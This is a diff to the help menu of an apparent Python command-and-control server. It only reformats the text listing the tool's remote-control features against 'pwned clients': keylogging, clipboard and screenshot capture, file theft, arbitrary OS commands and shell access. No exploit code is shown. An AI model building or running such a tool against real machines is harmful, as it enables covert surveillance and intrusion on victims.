@@ -255,33 +255,33 @@ class C2Handler(BaseHTTPRequestHandler):
                     elif command == "server help":
                         # Print Client Commands
                         print("Client Commands:",
-                              "client download FILENAME - transfer a file from the server to the client",
-                              "client upload FILENAME - transfer a file from the client to the server",
-                              "client zip FILENAME - zip and encrypt a file on the client",
-                              "client unzip FILENAME - unzip and decrypt a file on the client",
-                              "client kill - permanently shutdown the active client",
-                              "client delay SECONDS - change the delay setting for a client's reconnection attempts",
-                              "client get clipboard - grab a copy of the client's clipboard",
-                              "client keylog on - start up a keylogger on the client",
-                              "client keylog off - turn off the keylogger on the client and write the results to disk",
-                              "client type TEXT - Type the text you choice on a client's keyboard",
-                              "client screenshot - grab a copy of the client's screens",
-                              "client display IMAGE - display an image on the client's screen",
-                              "client flip screen - client flip - flip a client's screen upside down",
-                              "client roll screen - client roll - flip a client's screen upside down",
-                              "client max sound - client max - turn a client's volume all the way up",
-                              "client play FILENAME.wav - play a .wav sound file on the client",
-                              "* - run an OS command on the client that doesn't require input",
-                              "* & - run an OS command on the client in the background", sep="\n")
+                              "client download FILENAME => transfer a file from the server to the client",
+                              "client upload FILENAME => transfer a file from the client to the server",
+                              "client zip FILENAME => zip and encrypt a file on the client",
+                              "client unzip FILENAME => unzip and decrypt a file on the client",
+                              "client kill => permanently shutdown the active client",
+                              "client delay SECONDS => change the delay setting for a client's reconnection attempts",
+                              "client get clipboard => grab a copy of the client's clipboard",
+                              "client keylog on => start up a keylogger on the client",
+                              "client keylog off => turn off the keylogger on the client and write the results to disk",
+                              "client type TEXT => Type the text you choice on a client's keyboard",
+                              "client screenshot => grab a copy of the client's screens",
+                              "client display IMAGE => display an image on the client's screen",
+                              "client flip screen - client flip => flip a client's screen upside down",
+                              "client rotate screen - client rotate => flip a client's screen upside down",
+                              "client max sound - client max => turn a client's volume all the way up",
+                              "client play FILENAME.wav => play a .wav sound file on the client",
+                              "* => run an OS command on the client that doesn't require input",
+                              "* & => run an OS command on the client in the background", sep="\n")
                         # Print Server Commands
                         print("\nServer Commands:",
-                              "server show clients - print an active listing of our pwned clients",
-                              "server control PWNED_ID - change the active client that you have a prompt for",
-                              "server zip FILENAME - zip and encrypt a file in the outgoing folder on the server",
-                              "server unzip FILENAME - unzip and decrypt a file in the incoming folder on the server",
-                              "server exit - gracefully shuts down the server",
-                              "server list DIRECTORY - obtain a file listing of a directory on the server",
-                              "server shell - obtain a shell on the server", sep="\n")
+                              "server show clients => print an active listing of our pwned clients",
+                              "server control PWNED_ID => change the active client that you have a prompt for",
+                              "server zip FILENAME => zip and encrypt a file in the outgoing folder on the server",
+                              "server unzip FILENAME => unzip and decrypt a file in the incoming folder on the server",
+                              "server list DIRECTORY => obtain a file listing of a directory on the server",
+                              "server shell => obtain a shell on the server",
+                              "server exit => gracefully shuts down the server",sep="\n")
 
                     # Must respond to the client after a server command to cleanly finish the connection
                     self.http_response(204)
